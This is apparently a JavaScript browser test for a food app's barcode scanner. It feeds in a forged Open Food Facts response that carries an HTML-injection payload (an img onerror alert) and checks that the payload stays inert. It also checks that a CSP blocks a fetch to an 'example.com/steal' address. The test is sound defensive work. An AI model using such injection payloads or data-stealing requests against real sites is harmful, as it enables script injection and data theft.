// Browser-Test Barcode-Scanner: echte Fake-Kamera mit EAN-13, abgefangene (manipulierte) Open-Food-Facts-Antwort
import { startBrowser } from "./lib.mjs";

const OUT = process.argv[2];
const VIDEO = process.argv[3];
const t = await startBrowser(OUT, 9338, {
  extraArgs: [
    "--use-fake-device-for-media-stream",
    "--use-fake-ui-for-media-stream",
    `--use-file-for-fake-video-capture=${VIDEO}`,
  ],
});
const { step, check, shot, evaluate, results, send, sleep, dialogs } = t;

// ---------- Anfragen an Open Food Facts abfangen (es geht nichts ins Internet) ----------
const offRequests = [];
await send("Fetch.enable", {
  patterns: [{ urlPattern: "*openfoodfacts*", requestStage: "Request" }],
});
const evilName = 'Bio-Joghurt <img src=x onerror="alert(1)"> \u0007Natur';
const wsHandler = async (msg) => {
  if (msg.method !== "Fetch.requestPaused") return;
  offRequests.push({ url: msg.params.request.url, headers: msg.params.request.headers });
  const body = JSON.stringify({
    status: 1,
    product: { product_name_de: evilName, brands: "Testhof", quantity: "500 g" },
  });
  await send("Fetch.fulfillRequest", {
    requestId: msg.params.requestId,
    responseCode: 200,
    responseHeaders: [
      { name: "Content-Type", value: "application/json" },
      { name: "Access-Control-Allow-Origin", value: "*" },
    ],
    body: Buffer.from(body).toString("base64"),
  });
};
t.onMessage = wsHandler;

await t.open("http://localhost:4173/spielwiese/");
const chunkLoaded = () =>
  evaluate(`performance.getEntriesByType('resource').some(e => /assets\\/esm-/.test(e.name))`);
results.push(
  `${!(await chunkLoaded()) ? "OK  " : "FAIL"} Scanner-Bibliothek wird beim Start NICHT geladen`,
);

// ---------- 1. Scannen eines unbekannten Produkts ----------
await step(`__t.click('Barcode scannen')`, 500);
results.push(
  `${(await chunkLoaded()) ? "OK  " : "FAIL"} Scanner-Bibliothek wird erst beim Öffnen geladen`,
);
await shot("1-scanner");
let opened = false;
for (let i = 0; i < 40 && !opened; i++) {
  await sleep(250);
  opened = await evaluate(`!!document.querySelector('[role=dialog][aria-label="Neuer Artikel"]')`);
}
results.push(`${opened ? "OK  " : "FAIL"} Barcode aus dem Kamerabild erkannt → Formular geöffnet`);
results.push(`${offRequests.length === 1 ? "OK  " : "FAIL"} Genau 1 Anfrage an Open Food Facts`);
const req = offRequests[0];
results.push(
  `${req?.url === "https://world.openfoodfacts.org/api/v2/product/4006381333931.json?fields=product_name,product_name_de,brands,quantity" ? "OK  " : "FAIL"} Gesendet wird nur die Barcode-Nummer: ${req?.url}`,
);
const sentHeaders = Object.keys(req?.headers ?? {}).map((h) => h.toLowerCase());
results.push(
  `${!sentHeaders.includes("cookie") && !sentHeaders.includes("referer") ? "OK  " : "FAIL"} Kein Cookie, kein Referrer (Header: ${sentHeaders.join(", ")})`,
);

await check(
  "Name vorausgefüllt (als reiner Text)",
  `__t.scope().querySelector('input').value.startsWith('Bio-Joghurt <img')`,
);
await check(
  "Hinweis mit Marke und Menge",
  `__t.dialogText().includes('Gefunden bei Open Food Facts (Testhof, 500 g)')`,
);
await check("Barcode übernommen", `__t.dialogText().includes('4006381333931')`);
await check(
  "Eingeschleuster HTML-Code wurde NICHT ausgeführt",
  `!document.querySelector('img[src="x"]')`,
);
await check(
  "Steuerzeichen entfernt",
  `!__t.scope().querySelector('input').value.includes('\\u0007')`,
);
await shot("2-vorausgefuellt");
await step(`__t.radio('Kühlschrank')`);
await step(`__t.click('Speichern')`, 600);
await check(
  "Artikel gespeichert, Name als Text sichtbar",
  `__t.rows().includes('Bio-Joghurt <img src=x')`,
);

// ---------- 2. Erneut scannen → bekannter Artikel ----------
await step(`__t.click('Barcode scannen')`, 500);
opened = false;
for (let i = 0; i < 40 && !opened; i++) {
  await sleep(250);
  opened = await evaluate(
    `!!document.querySelector('[role=dialog][aria-label="Artikel bearbeiten"]')`,
  );
}
results.push(`${opened ? "OK  " : "FAIL"} Zweiter Scan öffnet den vorhandenen Artikel`);
await check("Hinweis 'Per Barcode gefunden'", `__t.dialogText().includes('Per Barcode gefunden')`);
results.push(
  `${offRequests.length === 1 ? "OK  " : "FAIL"} Bekannter Barcode → keine neue Online-Anfrage`,
);
await step(`__t.click('Schließen')`);

// ---------- 4. CSP als Sicherheitsnetz: andere Adressen sind blockiert ----------
const blocked = await evaluate(
  `fetch('https://example.com/steal?data=1').then(() => false, () => true)`,
);
results.push(`${blocked ? "OK  " : "FAIL"} CSP blockiert Verbindungen zu fremden Adressen`);

results.push(
  `${dialogs.length === 0 ? "OK  " : "FAIL"} Kein alert() ausgelöst (${dialogs.join(" | ")})`,
);
t.finish();
process.exit(0);
